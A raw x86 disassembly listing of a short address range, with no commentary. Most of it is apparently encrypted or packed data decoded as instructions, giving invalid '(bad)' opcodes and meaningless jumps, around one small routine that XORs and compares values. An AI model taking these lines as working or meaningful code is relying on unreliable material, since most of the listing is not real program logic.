  4056a9:	xor    BYTE PTR [esi],al
  4056ab:	push   cs
  4056ac:	neg    BYTE PTR [edx]
  4056ae:	retf   
  4056af:	arpl   WORD PTR ds:0xcc2c8e55,sp
  4056b5:	mov    BYTE PTR [edi-0xf],dl
  4056b8:	cdq    
  4056b9:	scas   al,BYTE PTR es:[edi]
  4056ba:	nop
  4056bb:	cmovne edi,DWORD PTR [ebp-0x6ffc3c08]
  4056c2:	dec    ecx
  4056c3:	mov    WORD PTR [ebx-0x41],fs
  4056c6:	pop    ds
  4056c7:	jp     0x4056fc
  4056c9:	(bad)  
  4056ca:	or     eax,edx
  4056cc:	mov    edx,DWORD PTR [ebp-0x4]
  4056cf:	dec    eax
  4056d0:	not    eax
  4056d2:	jmp    0x405a73
  4056d7:	int    0x14
  4056d9:	mov    ds:0x7ab8a317,eax
  4056de:	sbb    al,0x97
  4056e0:	mov    ah,0x18
  4056e2:	rcr    ebx,1
  4056e4:	aad    0xc
  4056e6:	xchg   edx,eax
  4056e7:	mov    esi,0xbdbebe1f
  4056ec:	les    edi,FWORD PTR [esi-0x11e72042]
  4056f2:	fcomp  QWORD PTR [ecx+ebx*4-0x46]
  4056f6:	(bad)  
  4056f7:	retf   0xe6eb
  4056fa:	lea    ecx,[edi+ebp*2-0x2]
  4056fe:	adc    BYTE PTR [eax-0x727fcd52],ch
  405704:	jp     0x40575c
  405706:	sbb    bh,dh
  405708:	push   ss
  405709:	adc    BYTE PTR [edx+edx*2-0x7e988069],dl
  405710:	or     BYTE PTR [ecx],bl
  405712:	pop    ebp
  405713:	mov    ebp,0xb5c4be24
  405718:	jmp    0x4167f30d
  40571d:	sbb    DWORD PTR [edi],edx
  40571f:	adc    ebx,edi
  405721:	xchg   ebx,eax
  405722:	or     DWORD PTR [edx-0x53b2411a],eax
  405728:	mov    ds:0xfa9813a3,eax
  40572d:	xchg   edi,eax
  40572e:	lock aam 0x56
  405731:	or     bl,bl
  405733:	xor    al,0x9f
  405735:	cwde   
  405736:	stc    
  405737:	imul   ebp,DWORD PTR ds:0x16cd1532,0x2530d148
  405741:	lods   al,BYTE PTR ds:[esi]
  405742:	jl     0x4057b2
  405744:	mov    ebx,0xfefdb4df
  405749:	mov    al,ds:0x23abeea3
  40574e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40574f:	(bad)  [edx]
  405751:	xor    DWORD PTR [edx+ecx*2+0x15],ebp
  405755:	adc    eax,0xd526b0
  40575a:	into   
  40575b:	push   edx
  40575c:	aam    0xe0
  40575e:	loopne 0x405717
  405760:	out    dx,eax
  405761:	pop    ss
  405762:	pop    esi
  405763:	popa   
  405764:	in     al,dx
  405765:	repz jmp 0x405799
  405768:	lahf   
  405769:	xor    al,0x4b
  40576b:	gs xor eax,0xd07bfd64
  405771:	addr16 xchg esp,eax
  405773:	fwait
  405774:	push   eax
  405775:	je     0x405730
  405777:	popf   
  405778:	or     BYTE PTR [eax+ebp*8-0x47],bl
  40577c:	dec    ecx
  40577d:	or     al,0xdf
  40577f:	jp     0x405744
  405781:	(bad)  
  405782:	sahf   
  405783:	push   edi
  405784:	sub    BYTE PTR [ebx-0x6a],ch
  405787:	scas   eax,DWORD PTR es:[edi]
  405788:	sbb    DWORD PTR [ebx-0x5d70fc5c],ebp
  40578e:	arpl   WORD PTR [esi+0x3a],di
  405791:	data16 inc si
  405794:	jbe    0x4057be
  405796:	cmp    BYTE PTR [esi-0x66569233],dl
  40579c:	les    ebp,FWORD PTR [ebx+edx*4]
  40579f:	mov    ch,0xa4
  4057a1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4057a2:	inc    edi
  4057a3:	repz and eax,esi
  4057a6:	sbb    dl,BYTE PTR [ebp+0x2c]
  4057a9:	or     BYTE PTR [edi],0xac
  4057ac:	cmp    edx,DWORD PTR [ebx+0x32]
  4057af:	sub    bh,BYTE PTR [ecx-0x2afcdda]
  4057b5:	in     eax,dx
  4057b6:	push   cs
  4057b7:	inc    eax
  4057b8:	mov    bh,0x54
  4057ba:	sbb    eax,0x9fd259a4
  4057bf:	mov    dl,0x0
  4057c1:	sub    bh,BYTE PTR [ecx+edi*2-0x3ebfa739]
  4057c8:	sub    eax,0x4ce002c3
  4057cd:	(bad)  
  4057ce:	ss cs and al,0xff
  4057d2:	sub    edx,DWORD PTR [ebp+0x3a3e0793]
  4057d8:	push   eax
  4057d9:	ds cmp esp,eax
  4057dc:	stos   DWORD PTR es:[edi],eax
  4057dd:	inc    eax
  4057de:	jns    0x405809
  4057e0:	aam    0x6d
  4057e2:	inc    DWORD PTR [esi]
  4057e4:	loopne 0x4057bc
  4057e6:	cmp    ch,bl
  4057e8:	push   ebx
  4057e9:	jmp    0x7c3d5335
  4057ee:	jne    0x4057fe
  4057f0:	sbb    al,0x63
  4057f2:	aam    0x16
  4057f4:	into   
  4057f5:	(bad)  
  4057f6:	sub    ebp,DWORD PTR [eax*1+0x4f709956]
  4057fd:	jo     0x405806
  4057ff:	out    dx,eax
  405800:	inc    ecx
  405801:	fild   WORD PTR [esi]
  405803:	mov    ss,WORD PTR [ebp-0x11695f8f]
  405809:	xchg   BYTE PTR [esi+0x430e473c],bl
  40580f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405810:	xchg   edx,eax
  405811:	leave  
  405812:	inc    ecx
  405813:	iret   
  405814:	sub    DWORD PTR [edi+edi*2],eax
  405817:	mov    ecx,0x1130f7b7
  40581c:	in     eax,dx
  40581d:	inc    ebp
  40581e:	or     esp,DWORD PTR [edx]
  405820:	fs stc 
  405822:	stos   BYTE PTR es:[edi],al
  405823:	ret    0x4a72
  405826:	hlt    
  405827:	xor    eax,0x5bffcf4e
  40582c:	arpl   WORD PTR [ebx],si
  40582e:	out    dx,eax
  40582f:	fdiv   DWORD PTR [esi-0x29e0e5d7]
  405835:	xor    eax,0x5d227fdc
  40583a:	inc    edx
  40583b:	sbb    esp,DWORD PTR [ebp-0x59]
  40583e:	mov    al,ds:0xab69c933
  405843:	sub    esi,edi
  405845:	mov    ?,WORD PTR [esi]
  405847:	mov    ebp,0xafbd2b8d
  40584c:	and    ch,BYTE PTR [edx+0x9]
  40584f:	or     bl,BYTE PTR [ebx-0x4a]
  405852:	(bad)  
  405853:	mov    ebx,0x312156b1
  405858:	mov    ds:0x71d02a01,eax
  40585d:	cmc    
  40585e:	lods   eax,DWORD PTR ds:[esi]
  40585f:	sub    al,BYTE PTR [bx+0x15b2]
  405864:	dec    edx
  405865:	jo     0x40580e
  405867:	ins    DWORD PTR es:[edi],dx
  405868:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405869:	or     ebp,ecx
  40586b:	jmp    0x4058c0
  40586d:	add    esi,edi
  40586f:	popf   
  405870:	mov    ch,0xda
  405872:	xor    cl,ah
  405874:	out    0xc8,al
  405876:	add    eax,0x270dbb8a
  40587b:	mov    cs,WORD PTR [esi+0x46]
  40587e:	in     al,0x71
  405880:	xchg   ebp,ebp
  405882:	jp     0x4058d7
  405884:	fwait
  405885:	in     eax,dx
  405886:	and    BYTE PTR [esi+ecx*1],bl
  405889:	(bad)
  40588d:	mov    dh,0xdd
  40588f:	sbb    ebp,DWORD PTR [ebx+0x20]
  405892:	ror    DWORD PTR [eax+eax*1+0x6],1
  405896:	mov    ds:0x311435d1,eax
  40589b:	in     eax,0x3e
  40589d:	scas   eax,DWORD PTR es:[edi]
  40589e:	mov    esi,ss
  4058a0:	dec    ecx
  4058a1:	push   0x45
  4058a3:	call   0x283:0xd719b90c
  4058aa:	repz aad 0x21
  4058ad:	sti    
  4058ae:	xchg   edx,eax
  4058af:	jl     0x40587f
  4058b1:	mov    eax,ds:0x98dc6e60
  4058b6:	xchg   ebp,eax
  4058b7:	(bad)  
  4058b8:	(bad)  
  4058b9:	sub    ebx,DWORD PTR [ebp+ecx*8+0x7b]
  4058bd:	xchg   ecx,eax
  4058be:	pop    edi
  4058bf:	stos   DWORD PTR es:[edi],eax
  4058c0:	cwde   
  4058c1:	push   edx
  4058c2:	or     DWORD PTR [esi],edx
  4058c4:	aas    
  4058c5:	cdq    
  4058c6:	cs popf 
  4058c8:	xor    eax,0xf92cd519
  4058cd:	mov    ds:0x467de995,eax
  4058d2:	scas   eax,DWORD PTR es:[edi]
  4058d3:	mov    DWORD PTR [ebx+0x4],edi
  4058d6:	push   ecx
  4058d7:	gs dec esi
  4058d9:	sbb    DWORD PTR [ecx-0x39],esp
  4058dc:	jb     0x405931
  4058de:	mov    ebx,0x24d4eb6
  4058e3:	retf   0xf9a1
  4058e6:	inc    esi
  4058e7:	stos   DWORD PTR es:[edi],eax
  4058e8:	sub    DWORD PTR [esi+esi*2+0x24],0x191a6c12
  4058f0:	push   0x2c
  4058f2:	arpl   WORD PTR [esi+edi*8-0x6a],bx
  4058f6:	xchg   ebp,eax
  4058f7:	shl    BYTE PTR [ecx+edi*1+0x22],cl
  4058fb:	rcr    DWORD PTR [ebp-0x34],cl
  4058fe:	mov    bh,0x52
  405900:	cdq    
  405901:	jl     0x4058a7
  405903:	mov    esi,0x148c9d7e
  405908:	clc    
  405909:	fldcw  WORD PTR [edi]
  40590b:	addr16 push ecx
  40590d:	sahf   
  40590e:	mov    edi,DWORD PTR [ebx+0x31a8c562]
  405914:	rol    eax,1
  405916:	add    eax,0x34b781fe
  40591b:	xchg   BYTE PTR [eax],bh
  40591d:	stc    
  40591e:	iret   
  40591f:	ret    0x8b29
  405922:	push   0xcf2e9741
  405927:	hlt    
  405928:	mov    ebx,0x3203f91c
  40592d:	(bad)  
  40592e:	mov    eax,0x103741fd
  405933:	fadd   QWORD PTR [ecx+0x20]
  405936:	xor    DWORD PTR [esi-0x67],edx
  405939:	(bad)  
  40593a:	or     ch,bh
  40593c:	jmp    0x1aa3cad3
  405941:	mov    eax,ds:0xc57f9c75
  405946:	mov    edi,0xaf36e953
  40594b:	dec    eax
  40594c:	shl    ch,1
  40594e:	and    ebp,edx
  405950:	add    cl,cl
  405952:	pop    es
  405953:	inc    esp
  405954:	mov    eax,0x6cd72274
  405959:	mov    al,0x30
  40595b:	jae    0x4059af
  40595d:	jne    0x4059d0
  40595f:	neg    bl
  405961:	adc    al,0x6c
  405963:	cmp    dl,al
  405965:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405966:	push   cs
  405967:	bound  ecx,QWORD PTR [edx-0x4944b22b]
  40596d:	icebp  
  40596e:	inc    esi
  40596f:	fs push ds
  405971:	loop   0x405925
  405973:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405974:	mov    ds:0x30bfaf10,al
  405979:	(bad)  
  40597a:	ss pop edx
  40597c:	stos   BYTE PTR es:[edi],al
  40597d:	fwait
  40597e:	or     eax,0x51d0d322
  405983:	mov    al,ds:0x3ab1905d
  405988:	lea    ecx,[ecx+ebp*4+0x2141d42c]
  40598f:	test   al,0x26
  405991:	test   al,0xb3
  405993:	jmp    0x7738:0x20bcb786
  40599a:	rol    BYTE PTR [ebx+0x51],1
  40599d:	cmp    dl,BYTE PTR [eax+0x465513c7]
  4059a3:	lahf   
  4059a4:	jae    0x4059c2
  4059a6:	add    DWORD PTR [edx],ecx
  4059a8:	cld    
  4059a9:	dec    ebx
  4059aa:	popf   
  4059ab:	cmp    DWORD PTR [esi-0x2939d05d],edx
  4059b1:	dec    ebp
  4059b2:	sub    DWORD PTR [ebx+0x48],eax
  4059b5:	dec    edi
  4059b6:	pop    DWORD PTR [eax-0x3c83fb0]
  4059bc:	inc    ebp
  4059bd:	call   0xaa48:0xb2e84bfe
  4059c4:	jns    0x40595b
  4059c6:	ret    0x521f
  4059c9:	dec    ecx
  4059ca:	pop    esi
  4059cb:	mov    cl,BYTE PTR [eax-0x56]
  4059ce:	push   ss
  4059cf:	mov    DWORD PTR [ebp+0x28],0x4f69e181
  4059d6:	fs pop edi
  4059d8:	cdq    
  4059d9:	sbb    bl,BYTE PTR [eax]
  4059db:	mov    eax,0x4a91b618
  4059e0:	and    eax,0x1713344d
  4059e5:	xor    bl,ah
  4059e7:	xor    esi,DWORD PTR [edx+0x7c31c8f9]
  4059ed:	(bad)  
  4059ee:	mov    BYTE PTR [ecx-0x4ea1dd97],0x13
  4059f5:	sahf   
  4059f6:	fwait
  4059f7:	jp     0x405a24
  4059f9:	jb     0x405a12
  4059fb:	pop    eax
  4059fc:	mov    eax,0x72ef79c5
  405a01:	dec    ebp
  405a02:	xor    al,0x9d
  405a04:	pop    ebx
  405a05:	jmp    0xb4a7b670
  405a0a:	fbld   TBYTE PTR [esi]
  405a0c:	ds test al,0x18
  405a0f:	jp     0x405a84
  405a11:	dec    ecx
  405a12:	test   ch,ah
  405a14:	mov    ah,0x9d
  405a16:	pushf  
  405a17:	sub    eax,0xdcaa3bf2
  405a1c:	ror    DWORD PTR [edx+ebp*1+0x66],cl
  405a20:	or     edi,ecx
  405a22:	or     bh,0x98
  405a25:	and    ebp,ebx
  405a27:	lock test eax,0xdaf32821
  405a2d:	test   eax,0x4dd6a50d
  405a32:	and    al,0xa8
  405a34:	or     ah,bl
  405a36:	sbb    al,0x7a
  405a38:	inc    eax
  405a39:	loopne 0x405a73
  405a3b:	lea    esi,[ebx-0x2]
  405a3e:	bound  edx,QWORD PTR [ecx-0x26831942]
  405a44:	dec    ecx
  405a45:	push   ebp
  405a46:	int    0xbe
  405a48:	retf   
  405a49:	out    0x9c,eax
  405a4b:	(bad)  
  405a4c:	mul    DWORD PTR [edi+eax*8-0x7ff27083]
  405a53:	imul   esi,DWORD PTR gs:[edi-0x6a003579],0xc5554e49
  405a5e:	neg    BYTE PTR [ebx-0x55ca2108]
  405a64:	xor    al,0x6
  405a66:	(bad)  
  405a67:	in     al,dx
  405a68:	es hlt 
  405a6a:	pop    eax
  405a6b:	leave  
  405a6c:	retf   0x8e72
  405a6f:	cdq    
  405a70:	arpl   sp,ax
  405a72:	sbb    ah,BYTE PTR [ebx]
  405a74:	ret    0xcf33
  405a77:	mov    DWORD PTR [ebp-0x4],eax
  405a7a:	mov    DWORD PTR [ebp+0x14],ecx
  405a7d:	xor    eax,eax
  405a7f:	or     DWORD PTR [ebp+0x14],eax
  405a82:	mov    eax,DWORD PTR [ebp-0x50]
  405a85:	mov    ecx,DWORD PTR [ebp-0x4c]
  405a88:	shrd   eax,ecx,0x2
  405a8c:	shr    ecx,0x2
  405a8f:	mov    cx,ax
  405a92:	mov    eax,DWORD PTR [ebp-0x50]
  405a95:	mov    edx,0x6d5d
  405a9a:	xor    cx,dx
  405a9d:	mov    edx,DWORD PTR [ebp-0x4c]
  405aa0:	xor    edx,edx
  405aa2:	shl    eax,0x1e
  405aa5:	mov    ax,dx
  405aa8:	or     ax,cx
  405aab:	mov    ecx,DWORD PTR [ebp-0x4]
  405aae:	cmp    WORD PTR [ecx],ax
  405ab1:	je     0x406288
  405ab7:	mov    eax,DWORD PTR [ebp+0x14]
  405aba:	sub    DWORD PTR [ebp-0x4],eax
  405abd:	mov    eax,DWORD PTR [esi]
  405abf:	jmp    0x405e60
  405ac4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405ac5:	test   eax,0x3c522b52
  405aca:	mov    eax,0x46ddf0ac
  405acf:	xchg   edx,eax
  405ad0:	dec    edx
  405ad1:	lods   eax,DWORD PTR ds:[esi]
  405ad2:	fst    QWORD PTR [eax-0x4141da43]
  405ad8:	mov    ebp,0x28bebec4
  405add:	mov    ch,0x4b
  405adf:	les    ebp,FWORD PTR [esi+0x37]
  405ae2:	fnstenv [edx+eiz*2+0x16]
  405ae6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405ae7:	jae    0x405a97
  405ae9:	out    0xf,al
  405aeb:	or     ebp,DWORD PTR [edx+0x2bea9e29]
  405af1:	pop    esi
  405af2:	hlt    
  405af3:	ret    0xad2e
  405af6:	lods   al,BYTE PTR ds:[esi]
  405af7:	mov    ah,0x7c
  405af9:	mov    dh,0x15
  405afb:	retf   
  405afc:	add    ah,ch
  405afe:	jmp    0x405a89
  405b00:	dec    edi
  405b01:	ret    
  405b02:	leave  
  405b03:	pop    eax
  405b04:	xor    BYTE PTR [esi-0x13],bl
  405b07:	mov    esp,0xb2062bcb
  405b0c:	cmp    cl,BYTE PTR [edx]
  405b0e:	std    
  405b0f:	arpl   WORD PTR [esi-0x1e],dx
  405b12:	jge    0x405ac2
  405b14:	jg     0x405ab5
  405b16:	mov    dh,al
  405b18:	mov    esp,0x22bcc882
  405b1d:	sbb    edi,edi
  405b1f:	sbb    al,0x2a
  405b21:	in     al,dx
  405b22:	mov    edi,0xf129020c
  405b27:	push   edx
  405b28:	stc    
  405b29:	dec    eax
  405b2a:	mov    cl,ah
  405b2c:	or     DWORD PTR [esi+edx*1+0x9e365c5],ecx
  405b33:	mov    WORD PTR [eax-0x9fd4c5d],ds
  405b39:	retf   0xa63
  405b3c:	test   al,0x20
  405b3e:	dec    edx
  405b3f:	xor    eax,0xc37cc5a9
  405b44:	add    ecx,DWORD PTR [ecx+0x3]
  405b47:	lods   al,BYTE PTR ds:[esi]
  405b48:	adc    ecx,DWORD PTR [esi]
  405b4a:	popf   
  405b4b:	pop    ebx
  405b4c:	out    0x4d,al
  405b4e:	sti    
  405b4f:	push   ebp
  405b50:	cli    
  405b51:	push   eax
  405b52:	xor    eax,0x86ee5598
  405b57:	fadd   DWORD PTR [ebp+0x54]
  405b5a:	cld    
  405b5b:	push   ebp
  405b5c:	and    al,0x5d
  405b5e:	ja     0x405af2
  405b60:	call   0xddfa34d0
  405b65:	sub    ch,BYTE PTR [esi]
  405b67:	outs   dx,BYTE PTR ds:[esi]
  405b68:	sub    eax,0x65d4b68
  405b6d:	or     al,dh
  405b6f:	shr    ah,0xb0
  405b72:	push   esp
  405b73:	adc    BYTE PTR [ebx+0x33],bh
  405b76:	sbb    al,0x5d
  405b78:	aam    0xb
  405b7a:	cli    
  405b7b:	and    al,0x2
  405b7d:	mov    ds:0x198d409e,al
  405b82:	mov    BYTE PTR [eax-0x23],dl
  405b85:	out    0xcf,eax
  405b87:	ins    BYTE PTR es:[edi],dx
  405b88:	cwde   
  405b89:	add    bl,0x5c
  405b8c:	pop    ebp
  405b8d:	jns    0x405b1b
  405b8f:	int    0x7f
  405b91:	jae    0x405b82
  405b93:	rol    BYTE PTR [ecx-0x2616a3ac],0x20
  405b9a:	sub    eax,0xd37a384c
  405b9f:	mov    ch,0xba
  405ba1:	out    dx,al
  405ba2:	jae    0x405b2f
  405ba4:	sub    bh,BYTE PTR [ecx-0x53]
  405ba7:	xchg   ebp,eax
  405ba8:	push   cs
  405ba9:	outs   dx,BYTE PTR ds:[esi]
  405baa:	pop    edx
  405bab:	inc    edi
  405bac:	cmp    al,0xa4
  405bae:	cmp    ecx,DWORD PTR [ecx-0x6f]
  405bb1:	(bad)  
  405bb2:	dec    ebx
  405bb3:	add    eax,0x56e47ee
  405bb8:	iret   
  405bb9:	test   al,0x1
  405bbb:	mov    eax,0xfde77475
  405bc0:	pop    ecx
  405bc1:	sbb    dh,BYTE PTR [eax-0x51505334]
  405bc7:	and    BYTE PTR [eax+0x78],dh
  405bca:	dec    ecx
  405bcb:	xor    al,BYTE PTR [edx+0x4e]
  405bce:	bt     ecx,ebx
  405bd1:	mov    edi,DWORD PTR ss:[ecx]
  405bd4:	fdiv   QWORD PTR [eax]
  405bd6:	sub    DWORD PTR [esi-0x478dc2fa],esp
  405bdc:	es shr bh,cl
  405bdf:	aad    0x86
  405be1:	cmc    
  405be2:	xchg   esp,eax
  405be3:	push   cs
  405be4:	mov    ecx,0x1e413af7
  405be9:	es inc edi
  405beb:	stos   DWORD PTR es:[edi],eax
  405bec:	and    BYTE PTR [ebx],dh
  405bee:	jns    0x405bee
  405bf0:	(bad)  [edi-0x2]
  405bf3:	addr16 dec ebx
  405bf5:	mov    WORD PTR [ebp+0x20bab2a2],cs
  405bfb:	mul    ah
  405bfd:	inc    edx
  405bfe:	pop    eax
  405bff:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405c00:	cmp    edx,ecx
  405c02:	xor    DWORD PTR [ebx-0x5f],esi
  405c05:	ds or  eax,0x84a9a38c
  405c0b:	jmp    0xc6a4:0xf2f28906
  405c12:	loope  0x405c71
  405c14:	loope  0x405bb5
  405c16:	cmp    al,0x60
  405c18:	push   esi
  405c19:	loopne 0x405bd4
  405c1b:	ins    BYTE PTR es:[edi],dx
  405c1c:	rol    DWORD PTR [edi],0x70
  405c1f:	dec    eax
  405c20:	sub    ebx,esp
  405c22:	aas    
  405c23:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405c24:	nop
  405c25:	sar    DWORD PTR [edx-0x42],cl
  405c28:	lds    esp,FWORD PTR [ebx+0x4c]
  405c2b:	xor    ch,BYTE PTR [eax-0x4e56d775]
  405c31:	cmc    
  405c32:	xor    al,0x97
  405c34:	mov    BYTE PTR [ebx-0x761f191b],al
  405c3a:	or     eax,0x880bf1a8
  405c3f:	out    dx,eax
  405c40:	test   al,0xfd
  405c42:	mov    ds,WORD PTR [ebp+0x1]
  405c45:	add    eax,0x584f1978
  405c4a:	adc    eax,0x29b1d105
  405c4f:	cmp    bl,BYTE PTR [ebp+0x6db36404]
  405c55:	or     al,0x1a
  405c57:	test   DWORD PTR [eax-0x3d],ebp
  405c5a:	inc    edx
  405c5b:	xlat   BYTE PTR ds:[ebx]
  405c5c:	dec    edx
  405c5d:	out    dx,eax
  405c5e:	stc    
  405c5f:	pop    ss
  405c60:	lea    ebp,[ecx]
  405c62:	test   al,0x0
  405c64:	sbb    eax,0x35127255
  405c69:	xchg   esi,eax
  405c6a:	mov    eax,ds:0xd8ff6951
  405c6f:	and    BYTE PTR [esi],dh
  405c71:	cmp    al,0xcd
  405c73:	fisubr WORD PTR [eax+0x68]
  405c76:	outs   dx,DWORD PTR ds:[esi]
  405c77:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405c78:	mov    cl,0x99
  405c7a:	mov    ebx,0x6feaec3e
  405c7f:	sbb    BYTE PTR [ecx],0xf
  405c82:	sahf   
  405c83:	inc    ebx
  405c84:	xor    DWORD PTR [edi],0x21
  405c87:	mov    ebx,0xda99c1d8
  405c8c:	js     0x405c49
  405c8e:	mov    ds:0x8ff4b546,al
  405c93:	sbb    edi,edi
  405c95:	into   
  405c96:	sahf   
  405c97:	dec    ecx
  405c98:	fiadd  DWORD PTR [edx-0x25]
  405c9b:	dec    esp
  405c9c:	mov    dl,0x19
  405c9e:	ins    BYTE PTR es:[edi],dx
  405c9f:	jge    0x405c80
  405ca1:	cmp    BYTE PTR [bp+0x1775],dl
  405ca6:	jno    0x405c5f
  405ca8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405ca9:	jmp    0x405cd3
  405cab:	mov    ebx,0x1c048062
  405cb0:	out    0x23,eax
  405cb2:	loop   0x405cea
  405cb4:	ret    0x7936
  405cb7:	push   esp
  405cb8:	sbb    DWORD PTR [eax-0x66],esi
  405cbb:	push   cs
  405cbc:	imul   edx,DWORD PTR [ecx-0x5bb0596c],0xffffffc4
  405cc3:	dec    DWORD PTR [eax]
  405cc5:	sar    al,cl
  405cc7:	test   bh,0xf2
  405cca:	mov    bl,0xab
  405ccc:	retf   
  405ccd:	or     DWORD PTR es:[esi+0x62],eax
  405cd1:	stos   DWORD PTR es:[edi],eax
  405cd2:	fiadd  DWORD PTR [ebx]
  405cd4:	aam    0xd1
  405cd6:	sub    cl,BYTE PTR [ebp+0x7c]
  405cd9:	outs   dx,BYTE PTR ds:[esi]
  405cda:	xlat   BYTE PTR ds:[ebx]
  405cdb:	pop    ebp
  405cdc:	adc    BYTE PTR [ebx],dl
  405cde:	mov    dl,0x93
  405ce0:	dec    edi
  405ce1:	je     0x405ca7
  405ce3:	(bad)  [ecx+0x5]
  405ce6:	cmp    dl,BYTE PTR [edi]
  405ce8:	aam    0x60
  405cea:	or     cl,BYTE PTR [esi]
  405cec:	int    0x7
  405cee:	dec    ebx
  405cef:	push   0xffffff84
  405cf1:	cwde   
  405cf2:	mov    dh,bh
  405cf4:	test   BYTE PTR [esi+0x63],dh
  405cf7:	push   ebp
  405cf8:	sbb    al,0xcb
  405cfa:	or     al,0x34
  405cfc:	inc    ecx
  405cfd:	data16 ja 0x405d3b
  405d00:	jns    0x405d05
  405d02:	cmp    eax,0xe3706ec5
  405d07:	xchg   esp,eax
  405d08:	in     al,0x26
  405d0a:	xlat   BYTE PTR ds:[ebx]
  405d0b:	pushw  ds
  405d0d:	jne    0x405cc3
  405d0f:	lods   eax,DWORD PTR ds:[esi]
  405d10:	mov    ch,0xf0
  405d12:	adc    edi,ebx
  405d14:	lods   al,BYTE PTR ds:[esi]
  405d15:	jge    0x405cff
  405d17:	jno    0x405d7c
  405d19:	jno    0x405ce3
  405d1b:	pop    edx
  405d1c:	xchg   esp,eax
  405d1d:	jb     0x405d87
  405d1f:	in     al,dx
  405d20:	stos   DWORD PTR es:[edi],eax
  405d21:	in     eax,dx
  405d22:	cmp    ebx,DWORD PTR [ebp-0x1b2782e]
  405d28:	mov    ecx,DWORD PTR [edx-0x3e]
  405d2b:	fdiv   st(1),st
  405d2d:	sub    DWORD PTR [edi-0x60],esi
  405d30:	add    eax,0xfbdd738a
  405d35:	xor    BYTE PTR [ecx-0x7d7de650],bh
  405d3b:	in     al,0x51
  405d3d:	push   ecx
  405d3e:	push   es
  405d3f:	ds dec esp
  405d41:	xor    al,dl
  405d43:	mov    cl,ch
  405d45:	mov    esp,0xa27529e8
  405d4a:	in     eax,0x36
  405d4c:	sub    edi,esp
  405d4e:	dec    edi
  405d4f:	call   esi
  405d51:	lds    esi,FWORD PTR [ebx-0x7986cc9d]
  405d57:	clc    
  405d58:	jmp    0x405dbc
  405d5a:	mov    eax,DWORD PTR [edx]
  405d5c:	dec    ebp
  405d5d:	dec    esp
  405d5e:	dec    esp
  405d5f:	xchg   esp,eax
  405d60:	or     al,0xc0
  405d62:	mov    BYTE PTR [edx+0x4ddcffe2],bh
  405d68:	cdq    
  405d69:	ss sbb cl,ch
  405d6c:	outs   dx,DWORD PTR ds:[si]
  405d6e:	test   al,0x22
  405d70:	ins    BYTE PTR es:[edi],dx
  405d71:	rcr    DWORD PTR [ecx],0xa8
  405d74:	mov    edx,0xa55fc489
  405d79:	fwait
  405d7a:	jae    0x405df4
  405d7c:	cmp    eax,0x9f723c88
  405d81:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405d82:	jae    0x405d05
  405d84:	ja     0x405d09
  405d86:	mov    ?,WORD PTR [esi+0x7c]
  405d89:	mov    bl,0xff
  405d8b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405d8c:	push   es
  405d8d:	jmp    0xfa9c:0x586151d9
  405d94:	pop    edx
  405d95:	mov    eax,ds:0xc087aab5
  405d9a:	or     DWORD PTR [ecx-0x156a8c5a],edi
  405da0:	mov    bh,BYTE PTR [ecx+0x58]
  405da3:	pop    ecx
  405da4:	pop    ebx
  405da5:	mov    bh,0x20
  405da7:	and    al,0x69
  405da9:	repz xlat BYTE PTR gs:[ebx]
  405dac:	mov    eax,0x521d982f
  405db1:	jl     0x405d93
  405db3:	imul   DWORD PTR [edi+0x7c]
  405db6:	int3   
  405db7:	push   0xa29c4d7
  405dbc:	xor    BYTE PTR [edi+eiz*2-0x6d],0x5b
  405dc1:	cld    
  405dc2:	cmp    eax,DWORD PTR [eax-0x618f2156]
  405dc8:	dec    edx
  405dc9:	mov    ecx,0x43b0bd6e
  405dce:	adc    DWORD PTR [esi-0x58],edi
  405dd1:	and    ah,BYTE PTR [eax-0x58]
  405dd4:	xlat   BYTE PTR ds:[ebx]
  405dd5:	xor    DWORD PTR [ebx+0x25a117dc],ebx
  405ddb:	(bad)  
  405ddc:	fld    st(3)
  405dde:	ins    DWORD PTR es:[edi],dx
  405ddf:	sub    edx,ebx
  405de1:	push   edi
  405de2:	mov    esi,DWORD PTR ds:0x5d159dc4
  405de8:	retf   
  405de9:	push   ss
  405dea:	inc    esp
  405deb:	mov    ah,BYTE PTR [ebp+0x57010a09]
  405df1:	xchg   ecx,eax
  405df2:	cmp    ebp,ecx
  405df4:	dec    esp
  405df5:	jb     0x405e0f
  405df7:	mov    esp,0xb34d5008
  405dfc:	retf   
  405dfd:	add    cl,ch
  405dff:	pop    edx
  405e00:	cld    
  405e01:	sbb    ebp,edx
  405e03:	lds    edx,FWORD PTR [ebp-0x71]
  405e06:	lock mov cl,0x56
  405e09:	test   DWORD PTR [edi-0x5e],ebp
  405e0c:	mov    ch,0x2c
  405e0e:	jnp    0x405e0f
  405e10:	jns    0x405dd0
  405e12:	out    0x22,eax
  405e14:	adc    eax,DWORD PTR [edi]
  405e16:	cmp    ecx,DWORD PTR [ecx+0x2b150e0c]
  405e1c:	popf   
  405e1d:	loop   0x405e29
  405e1f:	mov    bl,0x80
  405e21:	mov    edi,0x364ce23c
  405e26:	pusha  
  405e27:	sub    DWORD PTR [ecx-0x73],ebp
  405e2a:	xchg   esp,eax
  405e2b:	clc    
  405e2c:	cld    
  405e2d:	push   es
  405e2e:	dec    eax
  405e2f:	mov    ebx,0x41a87d56
  405e34:	ja     0x405e4b
  405e36:	or     eax,0xe50e4287
  405e3b:	xchg   edx,eax
  405e3c:	inc    edi
  405e3d:	pushf  
  405e3e:	mov    bl,0xf2
  405e40:	pop    edi
  405e41:	pop    ecx
  405e42:	fdivr  DWORD PTR [ebp+0x4f5e9145]
  405e48:	in     al,0x36
  405e4a:	add    al,0x8e
  405e4c:	rol    DWORD PTR [edi],cl
  405e4e:	jmp    0xd84cd4c3
  405e53:	fadd   QWORD PTR [ebx-0x40]
  405e56:	ins    BYTE PTR es:[edi],dx
